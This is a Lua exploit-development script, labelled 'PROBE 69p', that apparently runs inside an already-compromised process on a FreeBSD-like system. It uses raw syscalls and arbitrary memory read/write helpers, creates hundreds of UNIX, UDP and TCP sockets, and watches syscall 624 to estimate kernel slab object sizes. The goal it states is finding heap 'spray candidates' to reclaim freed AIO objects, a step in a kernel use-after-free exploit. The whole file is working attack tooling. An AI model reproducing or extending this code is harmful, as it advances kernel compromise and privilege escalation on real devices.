-- CRASH_CLASS: LOW
-- PROBE 69p: Measure socket kernel object size via sys 624 delta
--
-- socketpair(135) creates two sockets. If we create thousands,
-- 624 should jump whenever a new slab page is allocated.
-- objects_per_page from gaps, then object_size = 16384 / count.
-- Compare against AIO R zone (48B→64B bucket) and I zone (88B→128B).
-- If socket struct matches 64B, it's a spray candidate for R-object reclaim.

print("=== PROBE 69p: SOCKET ZONE SIZE MEASUREMENT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function read_624()
    local ok, v = pcall(function()
        return mk(624)(uint64(0), uint64(0), uint64(0))
    end)
    if ok and v then return N(v) end
    return nil
end

-- Verify 624
local baseline = read_624()
if baseline == nil then print("sys 624 not available"); return end
print("624 baseline: " .. baseline)

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local sv = memory.alloc(16)

local function analyze_jumps(name, jumps, total)
    print(string.format("  total %s created: %d", name, total))
    print(string.format("  total 624 jumps: %d", #jumps))

    if #jumps >= 2 then
        print("")
        print(string.format("  %s page boundary analysis:", name))
        local gaps = {}
        for j = 2, #jumps do
            local gap = jumps[j].index - jumps[j - 1].index
            table.insert(gaps, gap)
            if j <= 10 then
                print(string.format("    jump %d->%d: gap=%d objects (624: %d->%d delta=%d)",
                    j - 1, j, gap, jumps[j].prev, jumps[j].cur, jumps[j].delta))
            end
        end
        if #jumps > 10 then
            print(string.format("    ... (%d more jumps)", #jumps - 10))
        end

        local gap_counts = {}
        for _, g in ipairs(gaps) do
            gap_counts[g] = (gap_counts[g] or 0) + 1
        end
        local best_gap, best_count = 0, 0
        for g, c in pairs(gap_counts) do
            if c > best_count then best_gap = g; best_count = c end
        end

        if best_gap > 0 then
            local est_size = math.floor(16384 / best_gap)
            print(string.format("  ESTIMATED %s objects/page: %d (mode, seen %d/%d times)",
                name, best_gap, best_count, #gaps))
            print(string.format("  ESTIMATED %s object size: %d bytes (16384 / %d)",
                name, est_size, best_gap))

            if est_size >= 33 and est_size <= 64 then
                print("  *** MATCHES R zone (48B -> 64B bucket) — SPRAY CANDIDATE ***")
            elseif est_size >= 65 and est_size <= 128 then
                print("  *** MATCHES I/Q zone (88B -> 128B bucket) — SPRAY CANDIDATE ***")
            elseif est_size >= 129 and est_size <= 256 then
                print("  Size range 129-256B — no AIO zone match")
            else
                print(string.format("  Size %dB — no AIO zone match", est_size))
            end
        end
    elseif #jumps == 1 then
        print(string.format("  Only 1 jump at object #%d — need more objects", jumps[1].index))
    else
        print("  NO 624 jumps — 624 may not track slab pages for this type")
    end
end

-- ============================================================
-- [A] AF_UNIX SOCK_DGRAM socketpair
-- ============================================================
print("")
print("[A] AF_UNIX SOCK_DGRAM socketpair (up to 400 pairs = 800 sockets)")

local unix_dgram_fds = {}
local unix_dgram_jumps = {}
local prev_624 = read_624()

for i = 1, 400 do
    if not alive() then print("DEAD at pair " .. i); break end
    wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
    local ret = nil
    pcall(function()
        ret = mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv)))
    end)
    local fd1 = sgn(rd(N(sv)) or 0xFFFFFFFF)
    local fd2 = sgn(rd(N(sv) + 4) or 0xFFFFFFFF)
    if fd1 < 0 or fd2 < 0 then
        print(string.format("  socketpair failed at pair %d (fd=%d,%d)", i, fd1, fd2))
        break
    end
    table.insert(unix_dgram_fds, fd1)
    table.insert(unix_dgram_fds, fd2)

    local cur_624 = read_624()
    if cur_624 and prev_624 then
        local delta = cur_624 - prev_624
        if delta > 0 then
            table.insert(unix_dgram_jumps, {
                index = i * 2,
                prev = prev_624,
                cur = cur_624,
                delta = delta
            })
            if #unix_dgram_jumps <= 15 then
                print(string.format("  624 JUMP at pair #%d (obj %d): %d->%d (d=%d)",
                    i, i * 2, prev_624, cur_624, delta))
            end
        end
    end
    prev_624 = cur_624

    if i % 100 == 0 then
        print(string.format("  ... pair #%d, 624=%s, jumps=%d", i, tostring(cur_624), #unix_dgram_jumps))
    end
end

analyze_jumps("AF_UNIX_DGRAM", unix_dgram_jumps, #unix_dgram_fds)

-- Close half to save fd space
for i = 1, #unix_dgram_fds do
    pcall(function() mk(6)(uint64(unix_dgram_fds[i])) end)
end
unix_dgram_fds = {}

if not alive() then print("DEAD after A"); return end

-- ============================================================
-- [B] UDP sockets via socket(97)
-- ============================================================
print("")
print("[B] UDP sockets AF_INET SOCK_DGRAM (up to 800)")

local udp_fds = {}
local udp_jumps = {}
prev_624 = read_624()

for i = 1, 800 do
    if not alive() then print("DEAD at UDP " .. i); break end
    local ret = nil
    pcall(function()
        ret = mk(97)(uint64(2), uint64(2), uint64(17))
    end)
    local fd = sgn(ret or uint64(0xFFFFFFFF))
    if fd < 0 then
        print(string.format("  socket() failed at i=%d (fd=%d)", i, fd))
        break
    end
    table.insert(udp_fds, fd)

    local cur_624 = read_624()
    if cur_624 and prev_624 then
        local delta = cur_624 - prev_624
        if delta > 0 then
            table.insert(udp_jumps, {
                index = i,
                prev = prev_624,
                cur = cur_624,
                delta = delta
            })
            if #udp_jumps <= 15 then
                print(string.format("  624 JUMP at UDP #%d: %d->%d (d=%d)",
                    i, prev_624, cur_624, delta))
            end
        end
    end
    prev_624 = cur_624

    if i % 200 == 0 then
        print(string.format("  ... UDP #%d, 624=%s, jumps=%d", i, tostring(cur_624), #udp_jumps))
    end
end

analyze_jumps("UDP", udp_jumps, #udp_fds)

for _, fd in ipairs(udp_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
udp_fds = {}

if not alive() then print("DEAD after B"); return end

-- ============================================================
-- [C] TCP sockets via socket(97)
-- ============================================================
print("")
print("[C] TCP sockets AF_INET SOCK_STREAM (up to 500)")

local tcp_fds = {}
local tcp_jumps = {}
prev_624 = read_624()

for i = 1, 500 do
    if not alive() then print("DEAD at TCP " .. i); break end
    local ret = nil
    pcall(function()
        ret = mk(97)(uint64(2), uint64(1), uint64(6))
    end)
    local fd = sgn(ret or uint64(0xFFFFFFFF))
    if fd < 0 then
        print(string.format("  socket() failed at i=%d", i))
        break
    end
    table.insert(tcp_fds, fd)

    local cur_624 = read_624()
    if cur_624 and prev_624 then
        local delta = cur_624 - prev_624
        if delta > 0 then
            table.insert(tcp_jumps, {
                index = i,
                prev = prev_624,
                cur = cur_624,
                delta = delta
            })
            if #tcp_jumps <= 15 then
                print(string.format("  624 JUMP at TCP #%d: %d->%d (d=%d)",
                    i, prev_624, cur_624, delta))
            end
        end
    end
    prev_624 = cur_624

    if i % 100 == 0 then
        print(string.format("  ... TCP #%d, 624=%s, jumps=%d", i, tostring(cur_624), #tcp_jumps))
    end
end

analyze_jumps("TCP", tcp_jumps, #tcp_fds)

for _, fd in ipairs(tcp_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end

if not alive() then print("DEAD after C"); return end

-- ============================================================
-- [D] AF_UNIX SOCK_STREAM socketpair
-- ============================================================
print("")
print("[D] AF_UNIX SOCK_STREAM socketpair (up to 400 pairs)")

local unix_stream_fds = {}
local unix_stream_jumps = {}
prev_624 = read_624()

for i = 1, 400 do
    if not alive() then print("DEAD at pair " .. i); break end
    wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sv)))
    end)
    local fd1 = sgn(rd(N(sv)) or 0xFFFFFFFF)
    local fd2 = sgn(rd(N(sv) + 4) or 0xFFFFFFFF)
    if fd1 < 0 or fd2 < 0 then
        print(string.format("  socketpair failed at pair %d", i))
        break
    end
    table.insert(unix_stream_fds, fd1)
    table.insert(unix_stream_fds, fd2)

    local cur_624 = read_624()
    if cur_624 and prev_624 then
        local delta = cur_624 - prev_624
        if delta > 0 then
            table.insert(unix_stream_jumps, {
                index = i * 2,
                prev = prev_624,
                cur = cur_624,
                delta = delta
            })
            if #unix_stream_jumps <= 15 then
                print(string.format("  624 JUMP at pair #%d (obj %d): %d->%d (d=%d)",
                    i, i * 2, prev_624, cur_624, delta))
            end
        end
    end
    prev_624 = cur_624

    if i % 100 == 0 then
        print(string.format("  ... pair #%d, 624=%s, jumps=%d", i, tostring(cur_624), #unix_stream_jumps))
    end
end

analyze_jumps("AF_UNIX_STREAM", unix_stream_jumps, #unix_stream_fds)

for _, fd in ipairs(unix_stream_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("")
print("=== PROBE 69p COMPLETE ===")
